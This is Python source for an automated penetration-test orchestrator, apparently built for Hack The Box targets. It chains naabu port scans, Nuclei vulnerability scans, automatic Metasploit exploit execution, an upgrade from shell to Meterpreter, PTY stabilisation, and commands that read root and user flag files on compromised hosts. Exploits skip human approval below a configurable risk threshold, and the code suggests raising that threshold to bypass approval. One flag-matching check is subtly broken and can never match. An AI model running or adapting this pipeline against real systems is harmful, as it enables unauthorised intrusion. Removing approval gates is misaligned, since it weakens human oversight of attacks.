"""
AutoChain Orchestrator

Executes the automated pentest pipeline:

  Step 1:  Recon          — naabu → nmap service detect → tech detect
  Step 2:  Vuln Discovery — Nuclei scan + NVD/service CVE lookup
  Step 3:  Exploitation   — Metasploit auto-configure + execute
  Step 4:  Post-Exploit   — sysinfo, whoami, flag capture
  Step 5:  Session Upgrade — shell→meterpreter, TTY stabilisation
  Step 6:  HTB Templates  — from_template() factory for easy/medium

Design decisions
----------------
* Each phase is an ``async`` method that appends ``ChainStep`` records to
  the ``ChainResult`` for real-time SSE streaming.
* The approval gate is skipped automatically when the candidate's risk level
  is ≤ ``auto_approve_risk_level`` (set in ``ScanPlan``).
* All MCP calls are done through existing ``MCPClient`` which handles the
  JSON-RPC 2.0 protocol transparently.
* The orchestrator does NOT depend on LangGraph — it calls the MCP tool
  servers directly, keeping the chain deterministic and fast.
* ``AutoChain.from_template(name)`` loads a JSON template from the
  ``templates/`` sub-package and constructs a pre-configured ``ScanPlan``.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
from pathlib import Path
from typing import Any, AsyncIterator, Dict, List, Optional

from app.mcp.base_server import MCPClient

from .recon_mapper import ReconToExploitMapper
from .schemas import (
    ChainPhase,
    ChainResult,
    ChainStatus,
    ChainStep,
    ExploitPlan,
    ScanPlan,
)

# Directory that holds htb_easy.json, htb_medium.json, etc.
_TEMPLATES_DIR = Path(__file__).parent / "templates"

logger = logging.getLogger(__name__)

# Risk ordering (lower index = lower risk)
_RISK_ORDER = ["low", "medium", "high", "critical"]

# Regex that matches a standard 32-char hex CTF flag (HTB/THM/CTFd)
_FLAG_PATTERN = re.compile(r"[0-9a-f]{32}", re.IGNORECASE)

# Shell upgrade sequence injected into a plain shell session to get a stable TTY
_TTY_STABILIZE_COMMANDS = [
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
    "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
    "/usr/bin/script -qc /bin/bash /dev/null",
]


def _risk_is_auto_approved(candidate_risk: str, threshold: str) -> bool:
    """Return True if *candidate_risk* is within the auto-approve *threshold*."""
    if threshold == "none":
        return False
    try:
        return _RISK_ORDER.index(candidate_risk) <= _RISK_ORDER.index(threshold)
    except ValueError:
        return False


# Flag file paths to search on compromised hosts (Linux + Windows)
FLAG_PATHS = [
    "/root/root.txt",
    "/root/flag.txt",
    "/root/proof.txt",
    "/home/**/user.txt",
    "/home/**/flag.txt",
    "C:\\Users\\Administrator\\Desktop\\root.txt",
    "C:\\Users\\Administrator\\Desktop\\proof.txt",
    "C:\\Documents and Settings\\Administrator\\Desktop\\root.txt",
]

# Shell commands to read flag files (used with session_command)
FLAG_READ_COMMANDS_LINUX = [
    "cat /root/root.txt 2>/dev/null; cat /root/flag.txt 2>/dev/null; cat /root/proof.txt 2>/dev/null",
    "find /home -maxdepth 3 -name 'user.txt' -exec cat {} \\; 2>/dev/null",
    "find /home -maxdepth 3 -name 'flag.txt' -exec cat {} \\; 2>/dev/null",
]

FLAG_READ_COMMANDS_WINDOWS = [
    "type C:\\Users\\Administrator\\Desktop\\root.txt 2>nul",
    "type C:\\Users\\Administrator\\Desktop\\proof.txt 2>nul",
    "for /r C:\\Users /f %f in (user.txt) do @type %f 2>nul",
]


def _verify_flag_md5(flag_value: str) -> str:
    """Return the MD5 checksum of *flag_value* for verification purposes."""
    return hashlib.md5(flag_value.encode()).hexdigest()



class AutoChain:
    """
    Autonomous pentest pipeline that chains recon → exploitation → flags.

    Usage
    -----
    chain = AutoChain(plan)
    result = await chain.run()                  # blocking
    # or
    async for step in chain.stream():            # streaming
        ...

    Template usage
    ---------------------------
    chain = AutoChain.from_template("htb_easy", target="10.10.10.3")
    chain = AutoChain.from_template("htb_medium", target="10.10.10.40",
                                    auto_approve_risk_level="high")
    """

    # ------------------------------------------------------------------
    # Class methods — factory / template loading
    # ------------------------------------------------------------------

    @classmethod
    def from_template(
        cls,
        template_name: str,
        target: str,
        *,
        project_id: Optional[str] = None,
        auto_approve_risk_level: Optional[str] = None,
        naabu_url: str = "http://kali-tools:8000",
        nuclei_url: str = "http://kali-tools:8002",
        msf_url: str = "http://kali-tools:8003",
    ) -> "AutoChain":
        """
        Create an AutoChain instance pre-configured from a named JSON template.

        Templates live in ``backend/app/autochain/templates/``.  Built-in
        templates:

        * ``htb_easy``   — standard Easy HTB attack sequence
        * ``htb_medium`` — extended Medium HTB attack sequence

        Parameters
        ----------
        template_name:
            Name of the template file without the ``.json`` extension
            (e.g. ``"htb_easy"``).
        target:
            IP address or hostname of the target machine.
        project_id:
            Optional project identifier stored on the ``ScanPlan``.
        auto_approve_risk_level:
            Override the template's default auto-approve level.
            One of ``none | low | medium | high | critical``.

        Raises
        ------
        FileNotFoundError
            If the template file does not exist.
        ValueError
            If the template JSON is missing required fields.
        """
        template_path = _TEMPLATES_DIR / f"{template_name}.json"
        if not template_path.exists():
            available = [p.stem for p in _TEMPLATES_DIR.glob("*.json")]
            raise FileNotFoundError(
                f"Template '{template_name}' not found. "
                f"Available templates: {available}"
            )

        with template_path.open() as fh:
            tpl: Dict[str, Any] = json.load(fh)

        approve_level = (
            auto_approve_risk_level
            or tpl.get("auto_approve_risk_level", "none")
        )

        plan = ScanPlan(
            target=target,
            project_id=project_id,
            auto_approve_risk_level=approve_level,
        )

        instance = cls(
            plan=plan,
            naabu_url=naabu_url,
            nuclei_url=nuclei_url,
            msf_url=msf_url,
        )
        instance._template = tpl
        return instance

    @classmethod
    def list_templates(cls) -> List[Dict[str, str]]:
        """Return metadata for all available attack templates."""
        templates: List[Dict[str, str]] = []
        for path in sorted(_TEMPLATES_DIR.glob("*.json")):
            try:
                with path.open() as fh:
                    tpl = json.load(fh)
                templates.append(
                    {
                        "id": tpl.get("template_id", path.stem),
                        "name": tpl.get("name", path.stem),
                        "description": tpl.get("description", ""),
                        "difficulty": tpl.get("target_profile", {}).get(
                            "difficulty", "unknown"
                        ),
                        "version": tpl.get("version", ""),
                    }
                )
            except (json.JSONDecodeError, OSError) as exc:
                logger.warning("Could not load template %s: %s", path, exc)
        return templates

    def __init__(
        self,
        plan: ScanPlan,
        naabu_url: str = "http://kali-tools:8000",
        nuclei_url: str = "http://kali-tools:8002",
        msf_url: str = "http://kali-tools:8003",
    ):
        self.plan = plan
        self._naabu = MCPClient(naabu_url)
        self._nuclei = MCPClient(nuclei_url)
        self._msf = MCPClient(msf_url)
        self._mapper = ReconToExploitMapper(msf_server_url=msf_url)
        self.result = ChainResult(plan_id=plan.plan_id, target=plan.target)
        self._template: Optional[Dict[str, Any]] = None  # set by from_template()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def run(self) -> ChainResult:
        """Execute the full pipeline and return the final ChainResult."""
        self.result.status = ChainStatus.RUNNING
        try:
            await self._phase_recon()
            await self._phase_vuln_discovery()
            await self._phase_exploitation()
            await self._phase_session_upgrade()
            await self._phase_post_exploitation()
            self.result.finish(ChainStatus.COMPLETE)
        except asyncio.CancelledError:
            self.result.finish(ChainStatus.STOPPED)
        except Exception as exc:
            logger.error("AutoChain run failed: %s", exc, exc_info=True)
            self.result.finish(ChainStatus.FAILED, error=str(exc))
        return self.result

    async def stream(self) -> AsyncIterator[ChainStep]:
        """
        Execute the pipeline, yielding each ChainStep as it completes.

        Callers can await this generator to receive live progress updates
        suitable for SSE streaming.
        """
        self.result.status = ChainStatus.RUNNING
        try:
            async for step in self._stream_recon():
                yield step
            async for step in self._stream_vuln_discovery():
                yield step
            async for step in self._stream_exploitation():
                yield step
            async for step in self._stream_session_upgrade():
                yield step
            async for step in self._stream_post_exploitation():
                yield step
            self.result.finish(ChainStatus.COMPLETE)
        except asyncio.CancelledError:
            self.result.finish(ChainStatus.STOPPED)
        except Exception as exc:
            logger.error("AutoChain stream failed: %s", exc, exc_info=True)
            self.result.finish(ChainStatus.FAILED, error=str(exc))

    # ------------------------------------------------------------------
    # Phase 1 — Recon
    # ------------------------------------------------------------------

    async def _phase_recon(self) -> None:
        async for _ in self._stream_recon():
            pass

    async def _stream_recon(self) -> AsyncIterator[ChainStep]:
        self.result.current_phase = ChainPhase.RECON

        # --- Step 1a: Port scan ---
        step = ChainStep(
            phase=ChainPhase.RECON,
            name="port_scan",
            description=f"Naabu port scan on {self.plan.target}",
        )
        step.start()
        self.result.add_step(step)
        try:
            raw = await self._naabu.call_tool(
                "execute_naabu",
                {"target": self.plan.target, "ports": "top-1000"},
            )
            ports: List[Dict[str, Any]] = raw.get("ports", [])
            self.plan.open_ports = ports
            step.succeed(
                output=f"Discovered {len(ports)} open port(s): "
                + ", ".join(str(p.get("port", "?")) for p in ports[:20])
            )
        except Exception as exc:
            step.fail(str(exc))
        yield step

        # --- Step 1b: HTTP probe + tech detect ---
        http_ports = [
            p for p in self.plan.open_ports
            if str(p.get("port", "")) in ("80", "443", "8080", "8443", "8000", "8888")
            or p.get("service", "").lower() in ("http", "https")
        ]
        http_urls = [
            f"http{'s' if str(p.get('port')) in ('443', '8443') else ''}://{self.plan.target}:{p['port']}"
            for p in http_ports
        ]
        if not http_urls:
            http_urls = [f"http://{self.plan.target}"]
        self.plan.http_services = http_urls

        step2 = ChainStep(
            phase=ChainPhase.RECON,
            name="tech_detect",
            description=f"HTTP probe on {len(http_urls)} URL(s)",
        )
        step2.start()
        self.result.add_step(step2)
        try:
            technologies: List[Dict[str, Any]] = []
            for url in http_urls[:5]:  # cap at 5 to keep it fast
                probe_result = await self._naabu.call_tool(
                    "http_probe", {"target": url}
                )
                techs = probe_result.get("technologies", [])
                technologies.extend(techs)
            self.plan.detected_technologies = technologies
            step2.succeed(
                output=f"Detected {len(technologies)} technology record(s) across {len(http_urls)} URL(s)"
            )
        except Exception as exc:
            # HTTP probe failing is non-fatal (target may have no web surface)
            step2.fail(str(exc))
        yield step2

    # ------------------------------------------------------------------
    # Phase 2 — Vulnerability Discovery
    # ------------------------------------------------------------------

    async def _phase_vuln_discovery(self) -> None:
        async for _ in self._stream_vuln_discovery():
            pass

    async def _stream_vuln_discovery(self) -> AsyncIterator[ChainStep]:
        self.result.current_phase = ChainPhase.VULN_DISCOVERY

        # --- Step 2a: Nuclei scan on HTTP surfaces ---
        step = ChainStep(
            phase=ChainPhase.VULN_DISCOVERY,
            name="nuclei_scan",
            description=f"Nuclei vulnerability scan on {self.plan.target}",
        )
        step.start()
        self.result.add_step(step)
        nuclei_findings: List[Dict[str, Any]] = []
        try:
            for url in self.plan.http_services[:5]:
                raw = await self._nuclei.call_tool(
                    "execute_nuclei",
                    {
                        "target": url,
                        "severity": "medium",
                        "templates": "cve,sqli,xss,rce",
                    },
                )
                findings = raw.get("findings", [])
                nuclei_findings.extend(findings)

            self.plan.vulnerabilities = nuclei_findings
            self.result.total_vulns_found = len(nuclei_findings)
            step.succeed(
                output=f"Nuclei found {len(nuclei_findings)} vulnerability finding(s)"
            )
        except Exception as exc:
            step.fail(str(exc))
        yield step

        # --- Step 2b: Build ranked exploit candidates ---
        step2 = ChainStep(
            phase=ChainPhase.VULN_DISCOVERY,
            name="exploit_ranking",
            description="Rank exploit candidates from recon + Nuclei data",
        )
        step2.start()
        self.result.add_step(step2)
        try:
            candidates = self._mapper.get_exploit_candidates(
                port_scan_result=self.plan.open_ports,
                nuclei_findings=nuclei_findings,
            )
            self.plan.exploit_candidates = candidates
            lines = [
                f"  [{c.final_score:.1f}] {c.module_path or 'no_msf'} "
                f"(port {c.port}, {c.risk_level})"
                for c in candidates[:10]
            ]
            step2.succeed(
                output=f"Ranked {len(candidates)} exploit candidate(s):\n"
                + "\n".join(lines)
            )
        except Exception as exc:
            step2.fail(str(exc))
        yield step2

    # ------------------------------------------------------------------
    # Phase 3 — Exploitation
    # ------------------------------------------------------------------

    async def _phase_exploitation(self) -> None:
        async for _ in self._stream_exploitation():
            pass

    async def _stream_exploitation(self) -> AsyncIterator[ChainStep]:
        self.result.current_phase = ChainPhase.EXPLOITATION

        if not self.plan.exploit_candidates:
            step = ChainStep(
                phase=ChainPhase.EXPLOITATION,
                name="no_candidates",
                description="No exploit candidates — skipping exploitation phase",
            )
            step.start()
            step.succeed(output="No exploit candidates found from recon/vuln-discovery.")
            self.result.add_step(step)
            yield step
            return

        exploit_plan = ExploitPlan(candidates=list(self.plan.exploit_candidates))

        while exploit_plan.current is not None:
            candidate = exploit_plan.current
            step = ChainStep(
                phase=ChainPhase.EXPLOITATION,
                name="exploit_attempt",
                description=(
                    f"Attempting {candidate.module_path or 'manual'} "
                    f"against {self.plan.target}:{candidate.port}"
                ),
            )
            step.start()
            self.result.add_step(step)
            self.result.total_exploits_attempted += 1

            # Check auto-approval
            if not _risk_is_auto_approved(
                candidate.risk_level, self.plan.auto_approve_risk_level
            ):
                step.succeed(
                    output=(
                        f"Exploit requires manual approval "
                        f"(risk={candidate.risk_level}, "
                        f"threshold={self.plan.auto_approve_risk_level}). "
                        "Set AUTO_APPROVE_RISK_LEVEL to bypass."
                    )
                )
                yield step
                # Move on to next candidate — don't block the whole chain
                if not exploit_plan.advance():
                    break
                continue

            if not candidate.module_path:
                step.fail("No Metasploit module available for this candidate.")
                yield step
                if not exploit_plan.advance():
                    break
                continue

            try:
                params: Dict[str, Any] = {
                    "module_path": candidate.module_path,
                    "rhosts": self.plan.target,
                    "lport": 4444,
                }
                if candidate.port:
                    params["rport"] = candidate.port
                if candidate.payload_hint:
                    params["payload"] = candidate.payload_hint

                raw = await self._msf.call_tool("execute_module", params)
                session_opened = raw.get("session_opened", False)
                session_info = raw.get("session_info") or {}
                output_text = raw.get("output", "")

                if session_opened:
                    self.result.session_id = session_info.get("session_id")
                    self.result.session_type = session_info.get("type", "shell")
                    self.result.exploitation_success = True
                    step.succeed(
                        output=(
                            f"Session opened! "
                            f"ID={self.result.session_id} "
                            f"type={self.result.session_type}\n{output_text}"
                        )
                    )
                    yield step
                    return  # Stop trying more exploits once we have a session
                else:
                    step.fail(f"Exploit did not open a session.\n{output_text}")
                    yield step

            except Exception as exc:
                step.fail(str(exc))
                yield step

            if not exploit_plan.advance():
                break

    # ------------------------------------------------------------------
    # Phase 3.5 — Session Upgrade
    # ------------------------------------------------------------------

    async def _phase_session_upgrade(self) -> None:
        async for _ in self._stream_session_upgrade():
            pass

    async def _stream_session_upgrade(self) -> AsyncIterator[ChainStep]:
        """
        Upgrade a plain shell session to Meterpreter and stabilise the TTY.

        For Meterpreter sessions this phase is a no-op.
        For plain ``shell`` sessions it:
        1. Attempts ``shell_to_meterpreter`` via ``post/multi/manage/shell_to_meterpreter``.
        2. Falls back to spawning a PTY inside the shell using python/script.
        3. Optionally runs ``stty raw -echo`` to disable echo for cleaner I/O.
        """
        if self.result.session_id is None:
            return

        if self.result.session_type == "meterpreter":
            # Already upgraded — nothing to do
            step = ChainStep(
                phase=ChainPhase.POST_EXPLOITATION,
                name="session_upgrade",
                description="Session is already Meterpreter — no upgrade needed",
            )
            step.start()
            step.succeed(output="Meterpreter session active.")
            self.result.add_step(step)
            yield step
            return

        session_id = self.result.session_id

        # --- Attempt 1: shell_to_meterpreter post-module ---
        step = ChainStep(
            phase=ChainPhase.POST_EXPLOITATION,
            name="session_upgrade",
            description=f"Upgrading shell session {session_id} to Meterpreter",
        )
        step.start()
        self.result.add_step(step)
        try:
            raw = await self._msf.call_tool(
                "execute_module",
                {
                    "module_path": "post/multi/manage/shell_to_meterpreter",
                    "session": session_id,
                    "lport": 4445,
                },
            )
            new_session = raw.get("session_opened", False)
            new_session_info = raw.get("session_info") or {}
            if new_session:
                self.result.session_id = new_session_info.get(
                    "session_id", session_id
                )
                self.result.session_type = "meterpreter"
                step.succeed(
                    output=(
                        f"Upgraded to Meterpreter session "
                        f"ID={self.result.session_id}"
                    )
                )
                yield step
                return
            else:
                logger.debug(
                    "shell_to_meterpreter did not open a new session; "
                    "falling back to TTY spawn."
                )
        except Exception as exc:
            logger.debug("shell_to_meterpreter attempt failed: %s", exc)

        # --- Attempt 2: PTY spawn inside the shell ---
        tty_output = ""
        for cmd in _TTY_STABILIZE_COMMANDS:
            try:
                raw = await self._msf.call_tool(
                    "session_command",
                    {"session_id": session_id, "command": cmd},
                )
                tty_output = raw.get("output", "").strip()
                if tty_output:
                    break
            except Exception as exc:
                logger.debug("TTY stabilisation command failed: %s", exc)

        step.succeed(
            output=(
                f"Shell session retained (Meterpreter upgrade failed). "
                f"TTY spawn output: {tty_output or 'none'}"
            )
        )
        yield step

    # ------------------------------------------------------------------
    # Phase 4 — Post-Exploitation
    # ------------------------------------------------------------------

    async def _phase_post_exploitation(self) -> None:
        async for _ in self._stream_post_exploitation():
            pass

    async def _stream_post_exploitation(self) -> AsyncIterator[ChainStep]:
        self.result.current_phase = ChainPhase.POST_EXPLOITATION

        if self.result.session_id is None:
            step = ChainStep(
                phase=ChainPhase.POST_EXPLOITATION,
                name="no_session",
                description="No active session — skipping post-exploitation",
            )
            step.start()
            step.succeed(output="Exploitation did not produce a session.")
            self.result.add_step(step)
            yield step
            return

        session_id = self.result.session_id

        # --- Step 4a: sysinfo ---
        step = ChainStep(
            phase=ChainPhase.POST_EXPLOITATION,
            name="sysinfo",
            description="Gather system information",
        )
        step.start()
        self.result.add_step(step)
        os_info = ""
        try:
            raw = await self._msf.call_tool(
                "session_command",
                {"session_id": session_id, "command": "sysinfo"},
            )
            os_info = raw.get("output", "")
            self.result.os_info = os_info
            step.succeed(output=os_info)
        except Exception as exc:
            step.fail(str(exc))
        yield step

        # --- Step 4b: whoami / getuid ---
        step2 = ChainStep(
            phase=ChainPhase.POST_EXPLOITATION,
            name="whoami",
            description="Identify current user",
        )
        step2.start()
        self.result.add_step(step2)
        is_windows = "windows" in os_info.lower()
        uid_cmd = "getuid" if self.result.session_type == "meterpreter" else (
            "whoami" if is_windows else "id"
        )
        try:
            raw = await self._msf.call_tool(
                "session_command",
                {"session_id": session_id, "command": uid_cmd},
            )
            step2.succeed(output=raw.get("output", ""))
        except Exception as exc:
            step2.fail(str(exc))
        yield step2

        # --- Step 4c: Flag capture ---
        step3 = ChainStep(
            phase=ChainPhase.POST_EXPLOITATION,
            name="flag_capture",
            description="Search for CTF flags (root.txt / user.txt)",
        )
        step3.start()
        self.result.add_step(step3)
        try:
            commands = FLAG_READ_COMMANDS_WINDOWS if is_windows else FLAG_READ_COMMANDS_LINUX
            captured_output_parts: List[str] = []
            for cmd in commands:
                raw = await self._msf.call_tool(
                    "session_command",
                    {"session_id": session_id, "command": cmd},
                )
                out = raw.get("output", "").strip()
                if out:
                    captured_output_parts.append(out)
                    # Check each line for flag-like hex strings
                    for line in out.splitlines():
                        line = line.strip()
                        if _FLAG_PATTERN.fullmatch(line) or (
                            len(line) == 33 and line[-1] == "\n"
                        ):
                            self.result.flags.append(
                                {
                                    "content": line,
                                    "source_command": cmd,
                                    "md5": _verify_flag_md5(line),
                                }
                            )

            all_output = "\n".join(captured_output_parts)
            # Also extract any 32-char hex strings from combined output
            for match in _FLAG_PATTERN.finditer(all_output):
                flag_value = match.group(0)
                if not any(f["content"] == flag_value for f in self.result.flags):
                    self.result.flags.append(
                        {
                            "content": flag_value,
                            "source_command": "combined_search",
                            "md5": _verify_flag_md5(flag_value),
                        }
                    )

            if self.result.flags:
                step3.succeed(
                    output=f"Captured {len(self.result.flags)} flag(s): "
                    + ", ".join(f['content'] for f in self.result.flags)
                )
            else:
                step3.succeed(output="No flags found in standard locations.")
        except Exception as exc:
            step3.fail(str(exc))
        yield step3
